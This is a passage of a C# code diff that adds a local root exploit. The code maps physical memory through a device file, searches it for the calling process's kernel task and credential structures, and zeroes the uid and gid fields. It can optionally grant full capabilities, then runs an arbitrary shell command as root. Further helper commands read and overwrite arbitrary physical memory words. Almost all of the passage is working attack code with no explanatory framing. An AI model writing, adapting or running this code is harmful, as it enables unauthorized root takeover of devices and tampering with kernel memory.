+                location.TaskPhysical = physicalAddress;
+                location.PointerRelative = relative + 4;
+                location.VirtualAddress = credVirtual;
+                location.PhysicalAddress = credPhysical;
+                location.UidOffset = credUidOffset;
+                location.UidRun = credUidRun;
+                location.Usage = credUsage;
+                return true;
+            }
+
+            return false;
+        }
+        finally
+        {
+            munmap(mapping, new UIntPtr((uint)contextLength));
+        }
+    }
+
+    private static bool CandidateLooksLikeTaskComm(IntPtr mapping, int matchOffset, int contextLength, int needleLength)
+    {
+        if (matchOffset < 0 || matchOffset + 16 > contextLength || needleLength <= 0 || needleLength > 15)
+        {
+            return false;
+        }
+
+        for (int offset = needleLength; offset < 16; offset++)
+        {
+            if (Marshal.ReadByte(mapping, matchOffset + offset) != 0)
+            {
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    private static bool CandidateHasPid(IntPtr mapping, int matchOffset, int contextLength, int startRelative, int endRelative, int pid)
+    {
+        uint expected = unchecked((uint)pid);
+        for (int relative = startRelative; relative <= endRelative; relative += 4)
+        {
+            int offset = checked(matchOffset + relative);
+            if (offset < 0 || offset + 4 > contextLength)
+            {
+                continue;
+            }
+
+            uint value = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+            if (value == expected)
+            {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    private static int SameWriteCredential(int fileDescriptor, CredentialLocation location, uint uid)
+    {
+        ulong pageStart = location.PhysicalAddress & ~0xfffUL;
+        int pageOffset = checked((int)(location.PhysicalAddress - pageStart));
+        IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize, ProtectRead | ProtectWrite);
+        if (mapping == new IntPtr(-1))
+        {
+            int error = Marshal.GetLastWin32Error();
+            Console.Error.WriteLine("cred mmap write failed errno={0}", error);
+            return 1;
+        }
+
+        try
+        {
+            PrintMappedWords("cred_words_before", mapping, pageOffset, 32);
+            bool stable = true;
+            bool expected = true;
+            int words = location.UidRun < 8 ? location.UidRun : 8;
+            for (int index = 0; index < words; index++)
+            {
+                int offset = pageOffset + location.UidOffset + index * 4;
+                uint before = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+                Marshal.WriteInt32(mapping, offset, unchecked((int)before));
+                uint after = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+                Console.WriteLine("same_write word={0} offset=0x{1:x} before=0x{2:x8} after=0x{3:x8}", index, location.UidOffset + index * 4, before, after);
+                stable &= before == after;
+                expected &= before == uid;
+            }
+
+            Console.WriteLine("same_write_stable={0}", stable);
+            Console.WriteLine("same_write_expected_uid={0}", expected);
+            return stable && expected ? 0 : 1;
+        }
+        finally
+        {
+            munmap(mapping, new UIntPtr((uint)PageSize));
+        }
+    }
+
+    private static int SelfRootSystem(string[] arguments)
+    {
+        string command = arguments.Length >= 5 ? JoinArguments(arguments, 4) : "id; grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|CapAmb):' /proc/self/status";
+        return SelfRootCheck(arguments, false, command);
+    }
+
+    private static int SelfRootCheck(string[] arguments, bool setCapabilities, string systemCommand)
+    {
+        long start = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong totalLength = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 0x60000000;
+        string tag = arguments.Length >= 4 ? arguments[3] : CreateDefaultTag();
+        tag = NormalizeTaskName(tag);
+        int setNameResult = SetTaskName(tag);
+        if (setNameResult != 0)
+        {
+            return setNameResult;
+        }
+
+        uint uid = getuid();
+        uint gid = getgid();
+        int gidResult = setresgid(gid, gid, gid);
+        if (gidResult != 0)
+        {
+            int error = Marshal.GetLastWin32Error();
+            Console.Error.WriteLine("setresgid same-value failed errno={0}", error);
+            return 1;
+        }
+
+        int uidResult = setresuid(uid, uid, uid);
+        if (uidResult != 0)
+        {
+            int error = Marshal.GetLastWin32Error();
+            Console.Error.WriteLine("setresuid same-value failed errno={0}", error);
+            return 1;
+        }
+
+        int pid = getpid();
+        Console.WriteLine("tag={0}", tag);
+        Console.WriteLine("pid={0}", pid);
+        Console.WriteLine("uid_before={0}", uid);
+        Console.WriteLine("gid_before={0}", gid);
+        Console.WriteLine("set_capabilities={0}", setCapabilities);
+        Console.WriteLine("comm={0}", File.ReadAllText("/proc/self/comm").Trim());
+        Console.Out.Flush();
+
+        return WithDevice(fileDescriptor =>
+        {
+            if (!TryFindSelfCredential(fileDescriptor, start, totalLength, Encoding.ASCII.GetBytes(tag), uid, pid, out CredentialLocation location))
+            {
+                Console.Error.WriteLine("self credential not found");
+                return 1;
+            }
+
+            Console.WriteLine("self_task_physical=0x{0:x}", location.TaskPhysical);
+            Console.WriteLine("cred_pointer_relative={0}", location.PointerRelative);
+            Console.WriteLine("cred_virtual=0x{0:x8}", location.VirtualAddress);
+            Console.WriteLine("cred_physical=0x{0:x}", location.PhysicalAddress);
+            Console.WriteLine("cred_usage=0x{0:x8}", location.Usage);
+            Console.Out.Flush();
+            int result = RootCredential(fileDescriptor, location, setCapabilities);
+            Console.Out.Flush();
+            uint uidAfter = getuid();
+            uint euidAfter = geteuid();
+            uint gidAfter = getgid();
+            uint egidAfter = getegid();
+            Console.WriteLine("uid_after={0}", uidAfter);
+            Console.WriteLine("euid_after={0}", euidAfter);
+            Console.WriteLine("gid_after={0}", gidAfter);
+            Console.WriteLine("egid_after={0}", egidAfter);
+            PrintStatusIdentityLines();
+            if (uidAfter != 0 || euidAfter != 0 || gidAfter != 0 || egidAfter != 0)
+            {
+                Console.Error.WriteLine("root credential patch did not take effect");
+                return 1;
+            }
+
+            if (systemCommand != null)
+            {
+                Console.WriteLine("exec_command={0}", systemCommand);
+                Console.WriteLine("exec_begin");
+                Console.Out.Flush();
+                return ExecShellCommand(systemCommand);
+            }
+
+            return result;
+        });
+    }
+
+    private static int ExecShellCommand(string command)
+    {
+        ProcessStartInfo startInfo = new ProcessStartInfo();
+        startInfo.FileName = "/bin/sh";
+        startInfo.UseShellExecute = false;
+        startInfo.RedirectStandardOutput = false;
+        startInfo.RedirectStandardError = false;
+        startInfo.ArgumentList.Add("-c");
+        startInfo.ArgumentList.Add(command);
+        using (Process process = Process.Start(startInfo))
+        {
+            process.WaitForExit();
+            return process.ExitCode;
+        }
+    }
+
+    private static int RootCredential(int fileDescriptor, CredentialLocation location, bool setCapabilities)
+    {
+        ulong pageStart = location.PhysicalAddress & ~0xfffUL;
+        int pageOffset = checked((int)(location.PhysicalAddress - pageStart));
+        IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize, ProtectRead | ProtectWrite);
+        if (mapping == new IntPtr(-1))
+        {
+            int error = Marshal.GetLastWin32Error();
+            Console.Error.WriteLine("cred mmap write failed errno={0}", error);
+            return 1;
+        }
+
+        try
+        {
+            PrintMappedWords("cred_words_before", mapping, pageOffset, 24);
+            uint boundingLow = unchecked((uint)Marshal.ReadInt32(mapping, pageOffset + 16 * 4));
+            uint boundingHigh = unchecked((uint)Marshal.ReadInt32(mapping, pageOffset + 17 * 4));
+            for (int index = 1; index <= 8; index++)
+            {
+                Marshal.WriteInt32(mapping, pageOffset + index * 4, 0);
+            }
+
+            if (setCapabilities)
+            {
+                for (int index = 10; index <= 14; index += 2)
+                {
+                    Marshal.WriteInt32(mapping, pageOffset + index * 4, unchecked((int)boundingLow));
+                    Marshal.WriteInt32(mapping, pageOffset + (index + 1) * 4, unchecked((int)boundingHigh));
+                }
+            }
+
+            PrintMappedWords("cred_words_after", mapping, pageOffset, 24);
+            return 0;
+        }
+        finally
+        {
+            munmap(mapping, new UIntPtr((uint)PageSize));
+        }
+    }
+
+    private static int CredentialUidRewrite(string[] arguments)
+    {
+        if (arguments.Length < 4)
+        {
+            Console.Error.WriteLine("usage: cur physical expected_uid new_uid");
+            return 2;
+        }
+
+        ulong physicalAddress = unchecked((ulong)ParseInteger(arguments[1]));
+        uint expectedUid = unchecked((uint)ParseInteger(arguments[2]));
+        uint newUid = unchecked((uint)ParseInteger(arguments[3]));
+        return WithDevice(fileDescriptor =>
+        {
+            ulong pageStart = physicalAddress & ~0xfffUL;
+            int pageOffset = checked((int)(physicalAddress - pageStart));
+            IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize, ProtectRead | ProtectWrite);
+            if (mapping == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("credential mmap write failed errno={0}", error);
+                return 1;
+            }
+
+            try
+            {
+                PrintMappedWords("credential_words_before", mapping, pageOffset, 24);
+                for (int index = 1; index <= 8; index++)
+                {
+                    uint value = unchecked((uint)Marshal.ReadInt32(mapping, pageOffset + index * 4));
+                    if (value != expectedUid)
+                    {
+                        Console.Error.WriteLine("refusing rewrite word={0} expected=0x{1:x8} actual=0x{2:x8}", index, expectedUid, value);
+                        return 1;
+                    }
+                }
+
+                for (int index = 1; index <= 8; index++)
+                {
+                    Marshal.WriteInt32(mapping, pageOffset + index * 4, unchecked((int)newUid));
+                }
+
+                PrintMappedWords("credential_words_after", mapping, pageOffset, 24);
+                return 0;
+            }
+            finally
+            {
+                munmap(mapping, new UIntPtr((uint)PageSize));
+            }
+        });
+    }
+
+    private static int WriteWordsIf(string[] arguments)
+    {
+        if (arguments.Length < 5)
+        {
+            Console.Error.WriteLine("usage: wwi physical word_offset expected_words replacement_words");
+            return 2;
+        }
+
+        ulong physicalAddress = unchecked((ulong)ParseInteger(arguments[1]));
+        int wordOffset = (int)ParseInteger(arguments[2]);
+        uint[] expectedWords = ParseWordList(arguments[3]);
+        uint[] replacementWords = ParseWordList(arguments[4]);
+        if (expectedWords.Length == 0 || expectedWords.Length != replacementWords.Length)
+        {
+            Console.Error.WriteLine("word lists must be non-empty and equal length");
+            return 2;
+        }
+
+        return WithDevice(fileDescriptor =>
+        {
+            ulong pageStart = physicalAddress & ~0xfffUL;
+            int pageOffset = checked((int)(physicalAddress - pageStart));
+            IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize, ProtectRead | ProtectWrite);
+            if (mapping == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("word mmap write failed errno={0}", error);
+                return 1;
+            }
+
+            try
+            {
+                PrintMappedWords("words_before", mapping, pageOffset, 24);
+                int byteOffset = pageOffset + wordOffset * 4;
+                for (int index = 0; index < expectedWords.Length; index++)
+                {
+                    uint value = unchecked((uint)Marshal.ReadInt32(mapping, byteOffset + index * 4));
+                    if (value != expectedWords[index])
+                    {
+                        Console.Error.WriteLine("refusing write word={0} expected=0x{1:x8} actual=0x{2:x8}", wordOffset + index, expectedWords[index], value);
+                        return 1;
+                    }
+                }
+
+                for (int index = 0; index < replacementWords.Length; index++)
+                {
+                    Marshal.WriteInt32(mapping, byteOffset + index * 4, unchecked((int)replacementWords[index]));
+                }
+
+                PrintMappedWords("words_after", mapping, pageOffset, 24);
+                return 0;
+            }
+            finally
+            {
+                munmap(mapping, new UIntPtr((uint)PageSize));
+            }
+        });
+    }
+
+    private static int ReadWords(string[] arguments)
+    {
+        if (arguments.Length < 2)
+        {
+            Console.Error.WriteLine("usage: rw physical [words]");
+            return 2;
+        }
+
+        ulong physicalAddress = unchecked((ulong)ParseInteger(arguments[1]));
+        int words = arguments.Length >= 3 ? (int)ParseInteger(arguments[2]) : 24;
+        if (words < 1 || words > 256)
+        {
+            Console.Error.WriteLine("words must be between 1 and 256");
+            return 2;
+        }
+
+        return WithDevice(fileDescriptor =>
+        {
+            ulong pageStart = physicalAddress & ~0xfffUL;
+            int pageOffset = checked((int)(physicalAddress - pageStart));
+            if (pageOffset + words * 4 > PageSize)
+            {
+                Console.Error.WriteLine("read crosses page boundary");
+                return 2;
+            }
+
+            IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize, ProtectRead);
+            if (mapping == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("word mmap read failed errno={0}", error);
+                return 1;
+            }
+
+            try
+            {
+                Console.WriteLine("read_words physical=0x{0:x} page=0x{1:x} offset=0x{2:x} words={3}", physicalAddress, pageStart, pageOffset, words);
+                PrintMappedWords("words", mapping, pageOffset, words);
+                return 0;
+            }
+            finally
+            {
+                munmap(mapping, new UIntPtr((uint)PageSize));
+            }
+        });
+    }
+
+    private static uint[] ParseWordList(string text)
+    {
+        string[] parts = text.Split(new char[] { ',', ':' }, StringSplitOptions.RemoveEmptyEntries);
+        uint[] values = new uint[parts.Length];
+        for (int index = 0; index < parts.Length; index++)
+        {
+            values[index] = unchecked((uint)ParseInteger(parts[index]));
+        }
+
+        return values;
+    }
+
+    private static void PrintStatusIdentityLines()
+    {
+        foreach (string line in File.ReadAllLines("/proc/self/status"))
+        {
+            if (line.StartsWith("Uid:", StringComparison.Ordinal) ||
+                line.StartsWith("Gid:", StringComparison.Ordinal) ||
+                line.StartsWith("CapInh:", StringComparison.Ordinal) ||
+                line.StartsWith("CapPrm:", StringComparison.Ordinal) ||
+                line.StartsWith("CapEff:", StringComparison.Ordinal) ||
+                line.StartsWith("CapBnd:", StringComparison.Ordinal) ||
+                line.StartsWith("CapAmb:", StringComparison.Ordinal))
+            {
+                Console.WriteLine(line);
+            }
+        }
+    }
+
+    private static void PrintMappedWords(string label, IntPtr mapping, int offset, int words)
+    {
+        for (int lineStart = 0; lineStart < words; lineStart += 8)
+        {
+            StringBuilder builder = new StringBuilder();
+            builder.AppendFormat(CultureInfo.InvariantCulture, "{0} word={1}", label, lineStart);
+            for (int index = 0; index < 8 && lineStart + index < words; index++)
+            {
+                uint value = unchecked((uint)Marshal.ReadInt32(mapping, offset + (lineStart + index) * 4));
+                builder.AppendFormat(CultureInfo.InvariantCulture, " {0:x8}", value);
+            }
+
+            Console.WriteLine(builder.ToString());
+        }
+    }
+
+    private static uint ReadUInt32(byte[] bytes, int offset)
+    {
+        return (uint)(bytes[offset] | (bytes[offset + 1] << 8) | (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24));
+    }
+
+    private static string PreviewChunkWords(byte[] chunk, int offset)
+    {
+        StringBuilder builder = new StringBuilder();
+        builder.Append("values=");
+        for (int index = 0; index < 16 && offset + index * 4 + 4 <= chunk.Length; index++)
+        {
+            if (index != 0)
+            {
+                builder.Append(",");
+            }
+
+            builder.AppendFormat(CultureInfo.InvariantCulture, "{0:x8}", ReadUInt32(chunk, offset + index * 4));
+        }
+
+        return builder.ToString();
+    }
+
+    private static int MmapReadChecksum(string[] arguments)
+    {
+        long offset = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong lengthValue = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 4096;
+        int readLength = arguments.Length >= 4 ? (int)ParseInteger(arguments[3]) : 64;
+        if (readLength < 1 || (ulong)readLength > lengthValue)
+        {
+            Console.Error.WriteLine("invalid read length");
+            return 2;
+        }
+
+        UIntPtr length = new UIntPtr(lengthValue);
+
+        return WithDevice(fileDescriptor =>
+        {
+            IntPtr address = Mmap64(IntPtr.Zero, length, ProtectRead, MapShared, fileDescriptor, offset);
+            if (address == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("mmap64 failed errno={0}", error);
+                return 1;
+            }
+
+            try
+            {
+                ulong first = Checksum(address, readLength, out bool firstAllZero, out bool firstAllFF);
+                ulong second = Checksum(address, readLength, out bool secondAllZero, out bool secondAllFF);
+                Console.WriteLine("mmap read ok offset=0x{0:x} length=0x{1:x} read=0x{2:x}", offset, lengthValue, readLength);
+                Console.WriteLine("checksum1=0x{0:x16}", first);
+                Console.WriteLine("checksum2=0x{0:x16}", second);
+                Console.WriteLine("stable_double_read={0}", first == second);
+                Console.WriteLine("all_zero={0}", firstAllZero && secondAllZero);
+                Console.WriteLine("all_ff={0}", firstAllFF && secondAllFF);
+                return 0;
+            }
+            finally
+            {
+                int unmapResult = munmap(address, length);
+                if (unmapResult != 0)
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    Console.Error.WriteLine("munmap failed errno={0}", error);
+                }
+            }
+        });
+    }
+
+    private static ulong Checksum(IntPtr address, int count, out bool allZero, out bool allFF)
+    {
+        ulong hash = 14695981039346656037UL;
+        allZero = true;
+        allFF = true;
+        for (int index = 0; index < count; index++)
+        {
+            byte value = Marshal.ReadByte(address, index);
+            allZero &= value == 0;
+            allFF &= value == 0xff;
+            hash ^= value;
+            hash *= 1099511628211UL;
+        }
+
+        return hash;
+    }
+
+    private static int WithDevice(Func<int, int> action)
+    {
+        int fileDescriptor = open(DevicePath, OpenReadWrite);
+        if (fileDescriptor < 0)
+        {
+            int error = Marshal.GetLastWin32Error();
+            Console.Error.WriteLine("open failed path={0} errno={1}", DevicePath, error);
+            return 1;
+        }
+
+        try
+        {
+            return action(fileDescriptor);
+        }
+        finally
+        {
+            close(fileDescriptor);
+        }
+    }
+
+    private static long ParseInteger(string text)
+    {
+        if (text.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
+        {
+            return long.Parse(text.Substring(2), NumberStyles.HexNumber, CultureInfo.InvariantCulture);
+        }
+
+        return long.Parse(text, CultureInfo.InvariantCulture);
+    }
+
+    private static string JoinArguments(string[] arguments, int start)
+    {
+        StringBuilder builder = new StringBuilder();
+        for (int index = start; index < arguments.Length; index++)
+        {
+            if (builder.Length != 0)
+            {
+                builder.Append(" ");
+            }
+
+            builder.Append(arguments[index]);
+        }
+
+        return builder.ToString();
+    }
+}
